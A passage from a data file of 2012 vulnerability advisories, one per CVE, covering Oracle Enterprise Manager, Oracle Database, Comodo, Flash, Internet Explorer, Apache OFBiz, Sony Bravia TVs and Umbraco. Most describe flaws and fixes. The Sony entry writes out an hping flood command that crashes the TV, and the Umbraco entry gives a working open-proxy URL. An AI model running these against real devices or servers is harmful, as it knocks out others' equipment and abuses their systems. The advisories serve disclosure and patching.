There are no warranties with regard to this information. Neither the
author nor the publisher accepts any liability for any direct, indirect,
or consequential loss or damage arising from use of, or reliance on,
this information.
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1.4.11 (MingW32) - WinPT 1.4.3
Charset: UTF-8
iEYEARECAAYFAk+Qfx0ACgkQRx91imnNIgGI/wCgqXSOStpRZfnMwkh+60pys+Tc
rYcAn2o6p3yZKbJg5nFc2P5kb0ijL7lC
=QCBF
-----END PGP SIGNATURE-----"
10496,HTTP Response Splitting in Oracle Enterprise Manager (pageName parameter) (CVE-2012-0527),,CVE-2012-0527,"-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1
AppSecInc Team SHATTER Security Advisory
HTTP Response Splitting in Oracle Enterprise Manager (pageName parameter).
Risk Level:
Medium
Affected versions:
Oracle Enterprise Manager Database Control 10.2.0.5, 11.1.0.7, 11.2.0.3
(and previous patchsets)
Oracle Enterprise Manager Grid Control 10.2.0.5 (and previous patchsets)
Remote exploitable:
Yes
Credits:
This vulnerability was discovered and researched by Esteban Martinez
Fayo of Application Security Inc.
Details:
HTTP Response Splitting is a web application vulnerability where input
parameters are unsafely used in response headers allowing an attacker to
make the server print one (or more) new line sequences in the header
section which allows to set arbitrary headers, take control of the body,
or break the response into two or more separate responses. This can be
used to perform cross-site scripting, cross-user defacement and web
cache poisoning, among other attacks.
The 'pageName' parameter of web page
/em/console/database/schema/grantObjPrivs is vulnerable to this kind of
attacks.
Impact:
An attacker that convinces a valid Oracle Enterprise Manager user to
click or open a malicious link can take over the user's session.
Vendor Status:
Vendor was contacted and a patch was released.
Workaround:
There is no workaround for this vulnerability.
Fix:
Apply Oracle Critical Patch Update April 2012 available at Oracle Support.
CVE:
CVE-2012-0527
Links:
http://www.oracle.com/technetwork/topics/security/cpuapr2012-366314.html
https://www.teamshatter.com/?p=3453
Timeline:
Vendor Notification - 08/16/2011
Vendor Response - 08/18/2011
Fix - 4/17/2012
Public Disclosure - 4/19/2012
- --
_____________________________________________
Copyright (c) 2012 Application Security, Inc.
http://www.appsecinc.com
About Application Security, Inc.
AppSecInc is a pioneer and leading provider of database security
solutions for the enterprise.
By providing strategic and scalable software-only solutions -
AppDetectivePro for auditors and IT advisors, and DbProtect for the
enterprise - AppSecInc supports the database security lifecycle for some
of the most complex and demanding environments in the world across more
than 1,300 active commercial and government customers.
Leveraging the world's most comprehensive database security
knowledgebase from the company's renowned team of threat researchers,
TeamSHATTER, AppSecInc products help customers achieve unprecedented
levels of data security from nefarious or accidental activities, while
reducing overall risk and helping to ensure continuous regulatory and
industry compliance.
Disclaimer: The information in the advisory is believed to be accurate
at the time of publishing based on currently available information. Use
of the information constitutes acceptance for use in an AS IS condition.
There are no warranties with regard to this information. Neither the
author nor the publisher accepts any liability for any direct, indirect,
or consequential loss or damage arising from use of, or reliance on,
this information.
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1.4.11 (MingW32) - WinPT 1.4.3
Charset: UTF-8
iEYEARECAAYFAk+Qfs0ACgkQRx91imnNIgG0VgCePEMKr54zVy+j7xp2LPkmkbO4
d7cAn3NKD3adUs4L0ekEABkUf6tW0nxR
=8LE+
-----END PGP SIGNATURE-----"
10497,HTTP Response Splitting in Oracle Enterprise Manager (prevPage parameter) (CVE-2012-0526),,CVE-2012-0526,"-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1
AppSecInc Team SHATTER Security Advisory
HTTP Response Splitting in Oracle Enterprise Manager (prevPage parameter).
Risk Level:
Medium
Affected versions:
Oracle Enterprise Manager Database Control 10.2.0.5, 11.1.0.7, 11.2.0.3
(and previous patchsets)
Oracle Enterprise Manager Grid Control 10.2.0.5 (and previous patchsets)
Remote exploitable:
Yes
Credits:
This vulnerability was discovered and researched by Esteban Martinez
Fayo of Application Security Inc.
Details:
HTTP Response Splitting is a web application vulnerability where input
parameters are unsafely used in response headers allowing an attacker to
make the server print one (or more) new line sequences in the header
section which allows to set arbitrary headers, take control of the body,
or break the response into two or more separate responses. This can be
used to perform cross-site scripting, cross-user defacement and web
cache poisoning, among other attacks.
The 'prevPage' parameter of web page /em/console/database/schema/table
is vulnerable to this kind of attacks.
Impact:
An attacker that convinces a valid Oracle Enterprise Manager user to
click or open a malicious link can take over the user's session.
Vendor Status:
Vendor was contacted and a patch was released.
Workaround:
There is no workaround for this vulnerability.
Fix:
Apply Oracle Critical Patch Update April 2012 available at Oracle Support.
CVE:
CVE-2012-0526
Links:
http://www.oracle.com/technetwork/topics/security/cpuapr2012-366314.html
https://www.teamshatter.com/?p=3448
Timeline:
Vendor Notification - 08/16/2011
Vendor Response - 08/18/2011
Fix - 4/17/2012
Public Disclosure - 4/19/2012
- --
_____________________________________________
Copyright (c) 2012 Application Security, Inc.
http://www.appsecinc.com
About Application Security, Inc.
AppSecInc is a pioneer and leading provider of database security
solutions for the enterprise.
By providing strategic and scalable software-only solutions -
AppDetectivePro for auditors and IT advisors, and DbProtect for the
enterprise - AppSecInc supports the database security lifecycle for some
of the most complex and demanding environments in the world across more
than 1,300 active commercial and government customers.
Leveraging the world's most comprehensive database security
knowledgebase from the company's renowned team of threat researchers,
TeamSHATTER, AppSecInc products help customers achieve unprecedented
levels of data security from nefarious or accidental activities, while
reducing overall risk and helping to ensure continuous regulatory and
industry compliance.
Disclaimer: The information in the advisory is believed to be accurate
at the time of publishing based on currently available information. Use
of the information constitutes acceptance for use in an AS IS condition.
There are no warranties with regard to this information. Neither the
author nor the publisher accepts any liability for any direct, indirect,
or consequential loss or damage arising from use of, or reliance on,
this information.
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1.4.11 (MingW32) - WinPT 1.4.3
Charset: UTF-8
iEYEARECAAYFAk+QfegACgkQRx91imnNIgF9igCeOf7blacFjHI62y8mNXwwnwLT
RnoAnjw8sv+90Q9p11cczReudRQtM15Y
=HHlH
-----END PGP SIGNATURE-----"
10498,SQL Injection in Oracle Enterprise Manager (searchPage web page) (CVE-2012-0525),,CVE-2012-0525,"-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1
AppSecInc Team SHATTER Security Advisory
SQL Injection in Oracle Enterprise Manager (searchPage web page).
Risk Level:
High
Affected versions:
Oracle Enterprise Manager Database Control 11.1.0.7, 11.2.0.3 (and
previous patchsets)
Oracle Enterprise Manager Grid Control 10.2.0.5, 11.1.0.1 (and previous
patchsets)
Remote exploitable:
Yes
Credits:
This vulnerability was discovered and researched by Esteban Martinez
Fayo of Application Security Inc.
Details:
SQL Injection works by attempting to modify the parameters passed to an
application to change the SQL statements that are passed to a database.
SQL injection can be used to insert additional SQL statements to be
executed.
The 'SCPLBL_INSTALLED_DATE0DI' parameter used in web page
/em/console/ecm/search/searchPage is vulnerable to SQL Injection
attacks. This web page is part of Oracle Enterprise Manager web
application. It may be possible for a malicious user to execute SQL
statements with the elevated privileges of the SYSMAN database user in
the repository database. This user has the DBA role granted.
Impact:
This vulnerability allows an Oracle Enterprise Manager user to execute
SQL statements with the elevated privileges of the SYSMAN database user.
This may also be exploited by an attacker that convinces a valid user to
click or open a malicious link.
Vendor Status:
Vendor was contacted and a patch was released.
Workaround:
There is no workaround for this vulnerability.
Fix:
Apply Oracle Critical Patch Update April 2012 available at Oracle Support.
CVE:
CVE-2012-0525
Links:
http://www.oracle.com/technetwork/topics/security/cpuapr2012-366314.html
https://www.teamshatter.com/?p=3418
Timeline:
Vendor Notification - 08/16/2011
Vendor Response - 08/18/2011
Fix - 4/17/2012
Public Disclosure - 4/19/2012
- --
_____________________________________________
Copyright (c) 2012 Application Security, Inc.
http://www.appsecinc.com
About Application Security, Inc.
AppSecInc is a pioneer and leading provider of database security
solutions for the enterprise.
By providing strategic and scalable software-only solutions -
AppDetectivePro for auditors and IT advisors, and DbProtect for the
enterprise - AppSecInc supports the database security lifecycle for some
of the most complex and demanding environments in the world across more
than 1,300 active commercial and government customers.
Leveraging the world's most comprehensive database security
knowledgebase from the company's renowned team of threat researchers,
TeamSHATTER, AppSecInc products help customers achieve unprecedented
levels of data security from nefarious or accidental activities, while
reducing overall risk and helping to ensure continuous regulatory and
industry compliance.
Disclaimer: The information in the advisory is believed to be accurate
at the time of publishing based on currently available information. Use
of the information constitutes acceptance for use in an AS IS condition.
There are no warranties with regard to this information. Neither the
author nor the publisher accepts any liability for any direct, indirect,
or consequential loss or damage arising from use of, or reliance on,
this information.
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1.4.11 (MingW32) - WinPT 1.4.3
Charset: UTF-8
iEYEARECAAYFAk+QfYQACgkQRx91imnNIgGWOwCgsufjSL919rDcBdVfbBE1KksU
a68An04O2Aw4ieW27Vr23D+topK2cV/R
=GjVN
-----END PGP SIGNATURE-----"
10500,SQL Injection in Oracle Enterprise Manager (compareWizFirstConfig web page) (CVE-2012-0512),,CVE-2012-0512,"-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1
AppSecInc Team SHATTER Security Advisory
SQL Injection in Oracle Enterprise Manager (compareWizFirstConfig web page).
Risk Level:
High
Affected versions:
Oracle Enterprise Manager Database Control 11.1.0.7, 11.2.0.2 (and
previous patchsets)
Oracle Enterprise Manager Grid Control 10.2.0.4 (and previous patchsets)
Remote exploitable:
Yes
Credits:
This vulnerability was discovered and researched by Esteban Martinez
Fayo of Application Security Inc.
Details:
SQL Injection works by attempting to modify the parameters passed to an
application to change the SQL statements that are passed to a database.
SQL injection can be used to insert additional SQL statements to be
executed.
The 'fConfigGuid' parameter used in web page
/em/console/ecm/config/compareWizard/compareWizFirstConfig is vulnerable
to SQL Injection attacks. This web page is part of Oracle Enterprise
Manager web application. It may be possible for a malicious user to
execute SQL statements with the elevated privileges of the SYSMAN
database user in the repository database. This user has the DBA role
granted.
Impact:
This vulnerability allows an Oracle Enterprise Manager user to execute
SQL statements with the elevated privileges of the SYSMAN database user.
This may also be exploited by an attacker that convinces a valid user to
click or open a malicious link.
Vendor Status:
Vendor was contacted and a patch was released.
Workaround:
There is no workaround for this vulnerability.
Fix:
Apply Oracle Critical Patch Update April 2012 available at Oracle Support.
CVE:
CVE-2012-0512
Links:
http://www.oracle.com/technetwork/topics/security/cpuapr2012-366314.html
https://www.teamshatter.com/?p=3424
Timeline:
Vendor Notification - 10/16/2009
Vendor Response - 11/4/2009
Fix - 4/17/2012
Public Disclosure - 4/19/2012
- --
_____________________________________________
Copyright (c) 2012 Application Security, Inc.
http://www.appsecinc.com
About Application Security, Inc.
AppSecInc is a pioneer and leading provider of database security
solutions for the enterprise.
By providing strategic and scalable software-only solutions -
AppDetectivePro for auditors and IT advisors, and DbProtect for the
enterprise - AppSecInc supports the database security lifecycle for some
of the most complex and demanding environments in the world across more
than 1,300 active commercial and government customers.
Leveraging the world's most comprehensive database security
knowledgebase from the company's renowned team of threat researchers,
TeamSHATTER, AppSecInc products help customers achieve unprecedented
levels of data security from nefarious or accidental activities, while
reducing overall risk and helping to ensure continuous regulatory and
industry compliance.
Disclaimer: The information in the advisory is believed to be accurate
at the time of publishing based on currently available information. Use
of the information constitutes acceptance for use in an AS IS condition.
There are no warranties with regard to this information. Neither the
author nor the publisher accepts any liability for any direct, indirect,
or consequential loss or damage arising from use of, or reliance on,
this information.
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1.4.11 (MingW32) - WinPT 1.4.3
Charset: UTF-8
iEYEARECAAYFAk+Qe+MACgkQRx91imnNIgE1uQCgssZNVY3xF1UVMynHPLgkHKsU
dEgAn2KNVgJnNUes1S0R4v4tlMqYEF5n
=0cMh
-----END PGP SIGNATURE-----"
10502,Some failed authentication attempts using OCIPasswordChange API are not recorded (CVE-2012-0511),,CVE-2012-0511,"-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1
AppSecInc Team SHATTER Security Advisory
Some failed authentication attempts using OCIPasswordChange API are not
recorded.
Risk Level:
Medium
Affected versions:
Oracle Database Server version 10gR1, 10gR2 (10.2.0.4 and previous
patchsets) and 11gR1 (11.1.0.7 and previous patchsets)
Remote exploitable:
Yes (No authentication is required)
Credits:
This vulnerability was discovered and researched by Esteban Martinez
Fayo of Application Security Inc.
Details:
Oracle Database provides OCIPasswordChange API to change user passwords.
This API can be used while a user is logged on as well as before the
authentication process is completed, this is because it can be used for
accounts that have the password expired so that the user is able to
change an expired password for a new one.
When this API is used to authenticate a user and at the same time change
the password, failed logins attempts are recorded only sporadically.
The failed login attempt will be recorded only when the decryption of
the new password (AUTH_NEW_PASSWORD field) performed by the server, is
successful. This allows an attacker to perform much more failed logins
attempts than what are actually allowed by password policy. The
approximate rate of failed login attempts that are recorded is only one
every 200 or more attempts.
Impact:
Remote unauthenticated attackers can perform a much higher numbers of
login attempts without being locked out by the password policy. In
addition, the failed login attempt is not recorded in database auditing
trails.
Vendor Status:
Vendor was contacted and a patch was released.
Workaround:
Implement a strong password policy.
Use network or directory service based authentication as opposed to
native database authentication.
Fix:
Apply Oracle Critical Patch Update April 2012 available at Oracle Support.
CVE:
CVE-2012-0511
Links:
http://www.oracle.com/technetwork/topics/security/cpuapr2012-366314.html
https://www.teamshatter.com/?p=3440
Timeline:
Vendor Notification - 12/08/2011
Vendor Response - 12/15/2011
Fix - 4/17/2012
Public Disclosure - 4/19/2012
- --
_____________________________________________
Copyright (c) 2012 Application Security, Inc.
http://www.appsecinc.com
About Application Security, Inc.
AppSecInc is a pioneer and leading provider of database security
solutions for the enterprise.
By providing strategic and scalable software-only solutions -
AppDetectivePro for auditors and IT advisors, and DbProtect for the
enterprise - AppSecInc supports the database security lifecycle for some
of the most complex and demanding environments in the world across more
than 1,300 active commercial and government customers.
Leveraging the world's most comprehensive database security
knowledgebase from the company's renowned team of threat researchers,
TeamSHATTER, AppSecInc products help customers achieve unprecedented
levels of data security from nefarious or accidental activities, while
reducing overall risk and helping to ensure continuous regulatory and
industry compliance.
Disclaimer: The information in the advisory is believed to be accurate
at the time of publishing based on currently available information. Use
of the information constitutes acceptance for use in an AS IS condition.
There are no warranties with regard to this information. Neither the
author nor the publisher accepts any liability for any direct, indirect,
or consequential loss or damage arising from use of, or reliance on,
this information.
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1.4.11 (MingW32) - WinPT 1.4.3
Charset: UTF-8
iEYEARECAAYFAk+Qe2YACgkQRx91imnNIgGbKQCaAmGaN+X+t8TgB9KaE53DEApF
d5UAoJhleLxqf78/sgJZvtG7gsYu8e3a
=+2TC
-----END PGP SIGNATURE-----"
10503,Incomplete protection of Oracle Database locked accounts (CVE-2012-0510),,CVE-2012-0510,"-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1
AppSecInc Team SHATTER Security Advisory
Incomplete protection of Oracle Database locked accounts.
Risk Level:
Low
Affected versions:
Oracle Database Server version 10gR1, 10gR2 (10.2.0.5 and previous
patchsets) and 11gR1 (11.1.0.7 and previous patchsets)
Remote exploitable:
Yes (No authentication is required)
Credits:
This vulnerability was discovered and researched by Esteban Martinez
Fayo of Application Security Inc.
Details:
Oracle Database provides OCIPasswordChange API to change user passwords.
This API can be used while a user is logged on as well as before the
authentication process is completed, this is because it can be used for
accounts that have the password expired so that the user is able to
change an expired password for a new one.
It was observed that this API can be used to change the password of
users that are locked. The purpose of locking an account is to
deactivate it once it has received too many failed logins attempts or
when no login is expected. If it is allowed to change the password of a
locked account it is not correctly protecting it because brute force can
be applied on an account to change its password and eventually it will
get changed to a known password. The attacker will be able to log in
using the account only once it is unlocked.
Impact:
An unauthenticated attacker can perform on-line brute force of accounts
to change the password to a known value. The attacker will be able to
log in using the account only once it is unlocked.
Vendor Status:
Vendor was contacted and a patch was released.
Workaround:
There is no workaround for this vulnerability.
Fix:
Apply Oracle Critical Patch Update April 2012 available at Oracle Support.
CVE:
CVE-2012-0510
Links:
http://www.oracle.com/technetwork/topics/security/cpuapr2012-366314.html
https://www.teamshatter.com/?p=3443
Timeline:
Vendor Notification - 12/08/2011
Vendor Response - 12/15/2011
Fix - 4/17/2012
Public Disclosure - 4/19/2012
- --
_____________________________________________
Copyright (c) 2012 Application Security, Inc.
http://www.appsecinc.com
About Application Security, Inc.
AppSecInc is a pioneer and leading provider of database security
solutions for the enterprise.
By providing strategic and scalable software-only solutions -
AppDetectivePro for auditors and IT advisors, and DbProtect for the
enterprise - AppSecInc supports the database security lifecycle for some
of the most complex and demanding environments in the world across more
than 1,300 active commercial and government customers.
Leveraging the world's most comprehensive database security
knowledgebase from the company's renowned team of threat researchers,
TeamSHATTER, AppSecInc products help customers achieve unprecedented
levels of data security from nefarious or accidental activities, while
reducing overall risk and helping to ensure continuous regulatory and
industry compliance.
Disclaimer: The information in the advisory is believed to be accurate
at the time of publishing based on currently available information. Use
of the information constitutes acceptance for use in an AS IS condition.
There are no warranties with regard to this information. Neither the
author nor the publisher accepts any liability for any direct, indirect,
or consequential loss or damage arising from use of, or reliance on,
this information.
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1.4.11 (MingW32) - WinPT 1.4.3
Charset: UTF-8
iEYEARECAAYFAk+QeAYACgkQRx91imnNIgHaiACgvwlCq4y6e/DAkhMElhbEIBUA
3MsAoIXcRsvC6TQP20idA6yA/tihMmyz
=zO5Y
-----END PGP SIGNATURE-----"
10507,[CVE-2012-2273] Comodo Internet Security <5.10 BSOD (Win7 x64),,CVE-2012-2273,"[affected software]
Comodo Internet Security, until 5.9
[description]
BSOD under Windows 7 x64 if a 32b PE with a kernel ImageBase is executed.
such files are very unusual, but work perfectly if the PE contains
relocations, as shown at http://pe.corkami.com#ImageBase and
http://pe.corkami.com#relocations
PoCs downloadable on http://pe.corkami.com, files: tls_reloc ibkernel
ibkmanual reloccrypt
[author]
Ange Albertini (corkami.com)
[vendor communication]
5th January 2012 - details shared with the vendor
23th January 2012 - patch is planned
12th March 2012 - bug are fixed in 5.10
from http://www.comodo.com/home/download/release-notes.php?p=anti-malware
5.10.228257.2253: 12 March, 2012
* IMPROVED! Compatibility with other security suites is improved in
Windows 7 x64
* FIXED! BSOD when corrupted executables are loaded in memory in Windows 7 x64
* FIXED! HIPS can leak process handles with a special set of access rights
* FIXED! Smart scan crashes under certain circumstances
[mitigation]
update to 5.10 or later"
10508,VUPEN Security Research - Adobe Flash Player NetStream Remote Code Execution Vulnerability (APSB12-07 / CVE-2012-0773),,CVE-2012-0773,"VUPEN Security Research - Adobe Flash Player NetStream Remote Code Execution Vulnerability (APSB12-07 / CVE-2012-0773)
Website : http://www.vupen.com/english/research.php
Twitter : http://twitter.com/vupen
I. BACKGROUND
---------------------
Adobe Flash Player is a cross-platform browser-based application runtime
that delivers uncompromised viewing of expressive applications, content,
and videos across screens and browsers. It is installed on 98% of computers.
II. DESCRIPTION
---------------------
VUPEN Vulnerability Research Team discovered a critical vulnerability
in Adobe Flash Player.
The vulnerability is caused by an invalid object being used when parsing
a malformed video via ""NetStream.appendBytes"", which could allow remote
attackers to leak memory and execute arbitrary code despite ASLR and DEP enabled.
CVSS Score: 10 (AV:N/AC:L/Au:N/C:C/I:C/A:C)
III. AFFECTED PRODUCTS
---------------------------
Adobe Flash Player versions prior to 11.2.202.228
IV. Binary Analysis & Exploits/PoCs
---------------------------------------
In-depth technical analysis of the vulnerability and a working exploit
are available through the VUPEN Binary Analysis & Exploits portal:
http://www.vupen.com/english/services/ba-index.php
VUPEN Binary Analysis & Exploits Service provides private exploits and
in-depth technical analysis of the most significant public vulnerabilities
based on disassembly, reverse engineering, protocol analysis, and code audit.
The service allows governments and major corporations to evaluate risks, and
protect infrastructures and assets against new threats. The service also
allows security vendors (IPS, IDS, AntiVirus) to supplement their internal
research efforts and quickly develop both vulnerability-based and
exploit-based signatures to proactively protect their customers from attacks
and emerging threats.
V. SOLUTION
----------------
Upgrade to Adobe Flash Player version 11.2.202.228.
VI. CREDIT
--------------
This vulnerability was discovered by Nicolas Joly of VUPEN Security
VII. ABOUT VUPEN Security
---------------------------
VUPEN is the leadering provider of advanced vulnerability research for
defensive and offensive cyber security. VUPEN solutions enable corporations
and governments to measure and manage risks, eliminate vulnerabilities
before they can be exploited, and protect critical infrastructures and
assets against known and unknown vulnerabilities.
VUPEN has been recognized as ""Company of the Year 2011 in the Vulnerability
Research Market"" by Frost & Sullivan.
VUPEN solutions include:
* VUPEN Binary Analysis & Exploits Service (BAE) :
http://www.vupen.com/english/services/ba-index.php
* VUPEN Threat Protection Program (TPP) :
http://www.vupen.com/english/services/tpp-index.php
VIII. REFERENCES
----------------------
http://www.adobe.com/support/security/bulletins/apsb12-07.html
http://www.vupen.com/english/research.php
IX. DISCLOSURE TIMELINE
-----------------------------
2012-03-07 - Vulnerability Demonstrated at Pwn20wn
2012-04-18 - Public disclosure"
10520,VUPEN Security Research - Microsoft Internet Explorer VML Remote Code Execution (MS12-023 / CVE-2012-0172),,CVE-2012-0172,"VUPEN Security Research - Microsoft Internet Explorer VML Remote Code Execution (MS12-023 / CVE-2012-0172)
Website : http://www.vupen.com/english/research.php
Twitter : http://twitter.com/vupen
I. BACKGROUND
---------------------
""Microsoft Internet Explorer is a web browser developed by Microsoft and
included as part of the Microsoft Windows line of operating systems with
more than 60% of the worldwide usage share of web browsers."" (Wikipedia)
II. DESCRIPTION
---------------------
VUPEN Vulnerability Research Team discovered a critical vulnerability
in Microsoft Internet Explorer.
The vulnerability is caused by a use-after-free error within the
""vgx.dll"" component when processing certain VML behaviors, which could
be exploited by attackers to compromise a vulnerable system by tricking
a user into visiting a specially crafted web page.
CVSS Score: 10 (AV:N/AC:L/Au:N/C:C/I:C/A:C)
III. AFFECTED PRODUCTS
---------------------------
Microsoft Internet Explorer 8
Microsoft Internet Explorer 7
Microsoft Internet Explorer 6
Microsoft Windows XP Service Pack 3
Microsoft Windows XP Professional x64 Edition Service Pack 2
Microsoft Windows Server 2003 Service Pack 2
Microsoft Windows Server 2003 x64 Edition Service Pack 2
Microsoft Windows Server 2003 with SP2 for Itanium-based Systems
Microsoft Windows Vista Service Pack 1
Microsoft Windows Vista Service Pack 2
Microsoft Windows Vista x64 Edition Service Pack 1
Microsoft Windows Vista x64 Edition Service Pack 2
Microsoft Windows Server 2008 for 32-bit Systems
Microsoft Windows Server 2008 for 32-bit Systems Service Pack 2
Microsoft Windows Server 2008 for x64-based Systems
Microsoft Windows Server 2008 for x64-based Systems Service Pack 2
Microsoft Windows Server 2008 for Itanium-based Systems
Microsoft Windows Server 2008 for Itanium-based Systems Service Pack 2
Microsoft Windows 7 for 32-bit Systems
Microsoft Windows 7 for 32-bit Systems Service Pack 1
Microsoft Windows 7 for x64-based Systems
Microsoft Windows 7 for x64-based Systems Service Pack 1
Microsoft Windows Server 2008 R2 for x64-based Systems
Microsoft Windows Server 2008 R2 for x64-based Systems Service Pack 1
Microsoft Windows Server 2008 R2 for Itanium-based Systems
Microsoft Windows Server 2008 R2 for Itanium-based Systems Service Pack 1
IV. Binary Analysis & Exploits/PoCs
---------------------------------------
In-depth technical analysis of the vulnerability and a working exploit
are available through the VUPEN Binary Analysis & Exploits portal:
http://www.vupen.com/english/services/ba-index.php
VUPEN Binary Analysis & Exploits Service provides private exploits and
in-depth technical analysis of the most significant public vulnerabilities
based on disassembly, reverse engineering, protocol analysis, and code audit.
The service allows governments and major corporations to evaluate risks, and
protect infrastructures and assets against new threats. The service also
allows security vendors (IPS, IDS, AntiVirus) to supplement their internal
research efforts and quickly develop both vulnerability-based and
exploit-based signatures to proactively protect their customers from attacks
and emerging threats.
V. VUPEN Threat Protection Program
-----------------------------------
Governments and major corporations which are members of the VUPEN Threat
Protection Program (TPP) have been proactively alerted about the vulnerability
when it was discovered by VUPEN in advance of its public disclosure, and
have received a detailed attack detection guidance to protect national and
critical infrastructures against potential 0-day attacks exploiting this
vulnerability:
http://www.vupen.com/english/services/tpp-index.php
VI. SOLUTION
----------------
Apply the Microsoft MS12-023 security update.
VII. CREDIT
--------------
This vulnerability was discovered by Nicolas Joly of VUPEN Security
VIII. ABOUT VUPEN Security
---------------------------
VUPEN is the world leader in vulnerability research for defensive and
offensive cyber security. VUPEN solutions enable corporations and governments
to measure and manage risks, eliminate vulnerabilities before they can be
exploited, and protect critical infrastructures and assets against known and
unknown vulnerabilities.
VUPEN has been recognized as ""Company of the Year 2011 in the Vulnerability
Research Market"" by Frost & Sullivan.
VUPEN solutions include:
* VUPEN Binary Analysis & Exploits Service (BAE) :
http://www.vupen.com/english/services/ba-index.php
* VUPEN Threat Protection Program (TPP) :
http://www.vupen.com/english/services/tpp-index.php
IX. REFERENCES
----------------------
http://technet.microsoft.com/en-us/security/bulletin/ms12-023
http://www.vupen.com/english/research.php
X. DISCLOSURE TIMELINE
-----------------------------
2012-02-28 - Vulnerability Discovered by VUPEN and shared with TPP customers
2012-04-10 - Public disclosure"
10535,[CVE-2012-1622] Apache OFBiz information disclosure vulnerability,,CVE-2012-1622,"CVE-2012-1622: Apache OFBiz 10.04 and later allows remote attackers to execute arbitrary code via unspecified vectors
Severity: Critical
Vendor:
The Apache Software Foundation - Apache OFBiz
======Versions Affected======
Apache OFBiz 10.04 (also known as 10.04.01)
======Description======
Apache OFBiz 10.04 and later allows remote attackers to execute arbitrary code via unspecified vectors
====== Mitigation======
10.04 users should upgrade to 10.04.02
======Credit======
This issue was discovered by Jacopo Cappellato, Apache OFBiz project"
10536,[CVE-2012-1621] Apache OFBiz information disclosure vulnerability,,CVE-2012-1621,"CVE-2012-1621: Apache OFBiz information disclosure vulnerability
Severity: Important
Vendor:
The Apache Software Foundation - Apache OFBiz
======Versions Affected======
Apache OFBiz 10.04 (also known as 10.04.01)
======Description======
Multiple XSS:
XSS 1:
Error messages containing user input returned via ajax requests
weren't being escaped
XSS 2:
Parameter arrays (converted to Lists by OFBiz) weren't being
auto-encoded in freemarker templates. An attacker could send multiple
parameters sharing the same name where only a single value was
expected, because the value was a List instead of a String rendering
the parameter in freemarker via ${parameter} would bypass OFBiz's
automatic html encoding.
XSS 3:
Requests that used the cms event were susceptible to XSS attacks via
the contentId and mapKey parameters because if the content was found
to be missing an unencoded error message containing the supplied
values was being streamed to the browser.
XSS 4:
Requests that used the experimental Webslinger component were susceptible to XSS attacks
====== Mitigation======
10.04 users should upgrade to 10.04.02
======Credit======
These issues were discovered by Matias Madou (mmadou hp com) of Fortify/HP Security Research Group"
10594,Sony Bravia Remote Denial of Service - CVE-2012-2210,,CVE-2012-2210,"# Exploit Title: Sony Bravia Remote Denial of Service
# Date: 04/04/2012
# Author: Gabriel Menezes Nunes
# Version: Sony Bravia TV
# Tested on: Sony Bravia TV (KDL-32CX525)
# CVE: CVE-2012-2210
Playing with my TV, I found a bug that can crash the device.
Running a hping command against a Sony Bravia TV (KDL-32CX525),
all the functions stop working instantly. You cannot change the
volume, channels or access any function. Instantly. After 35 seconds
the TV stop working and back. This happens 3 times. At fourth time, the
TV shuts down. In less than 3 minutes, the TV is off remotely. It is
necessary to turn on the TV physically.
Attack:
hping -S TV.IP.Address -p anyport -i u1 --flood
Example: hping -S 10.0.0.3 -p 2828 -i u1 --flood"
10595,[MATTA-2012-001] CVE-2012-1301; 0day; Open Proxy vulnerability in Umbraco 4.7,,CVE-2012-1301,"We don't release 0days... except when vendors show no interest in fixing
their their bugs.
http://umbraco.com/umbraco/dashboard/FeedProxy.aspx?url=http://en.wikipedia.org/wiki/Open_proxy
Have fun.
-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA256
Matta Consulting - Matta Advisory
https://www.trustmatta.com
Umbraco Open Proxy Vulnerability
Advisory ID: MATTA-2012-001
CVE reference: CVE-2012-1301
Affected platforms: Umbraco
Version: 4.x
Date: 2012-January-26
Security risk: High
Vulnerability: Umbraco bundles a script behaving like an open-proxy
Researcher: Florent Daigniere
Vendor Status: Notified
Vulnerability Disclosure Policy:
https://www.trustmatta.com/advisories/matta-disclosure-policy-01.txt
Permanent URL:
https://www.trustmatta.com/advisories/MATTA-2012-001.txt
=====================================================================
Description:
Vulnerable installations of Umbraco allow unauthenticated users to
abuse the script FeedProxy.aspx into proxying requests on their
behalf through the ""url"" parameter.
=====================================================================
Impact
Anyone with access to the management interface of umbraco can abuse
FeedProxy script into proxying requests for them.
The impact of such vulnerability is difficult to measure and depends
on the specifics of the deployment. Typically, this can allow
attackers to connect to other systems, bypassing controls or be
abused to trick users and browsers into performing actions they
wouldn't otherwise consider (XSS, phishing, ...).
This particular vulnerability can also be abused to create a powerful
Denial of Service: a single recursive proxy-request will take the
application server down and, depending on the configuration of the
server, might severely affect unrelated services.
=====================================================================
Versions affected:
Umbraco version 4.7.0 tested.
=====================================================================
Threat mitigation
Matta consultants recommend deleting the FeedProxy script or
upgrading umbraco to version 5+.
=====================================================================
Credits
This vulnerability was discovered and researched by Florent Daigniere
from Matta Consulting.
=====================================================================
History
26-01-12 initial discovery
21-02-12 initial attempt to contact the vendor
24-02-12 second attempt to contact the vendor
27-02-12 third attempt to contact the vendor
27-02-12 response from the vendor o/
27-02-12 draft of this advisory is sent to the vendor
29-02-12 CVE-2012-1301 is assigned
05-04-12 publication of the advisory
=====================================================================
About Matta
Matta is a privately held company with Headquarters in London, and a
European office in Amsterdam. Established in 2001, Matta operates
in Europe, Asia, the Middle East and North America using a respected
team of senior consultants. Matta is an accredited provider of
Tiger Scheme training; conducts regular research and is the developer
behind the webcheck application scanner, and colossus network scanner.
https://www.trustmatta.com
https://www.trustmatta.com/training.html
https://www.trustmatta.com/webapp_va.html
https://www.trustmatta.com/network_va.html
=====================================================================
Disclaimer and Copyright
Copyright (c) 2012 Matta Consulting Limited. All rights reserved.
This advisory may be distributed as long as its distribution is
free-of-charge and proper credit is given.
The information provided in this advisory is provided ""as is"" without
warranty of any kind. Matta Consulting disclaims all warranties, either
express or implied, including the warranties of merchantability and
fitness for a particular purpose. In no event shall Matta Consulting or
its suppliers be liable for any damages whatsoever including direct,
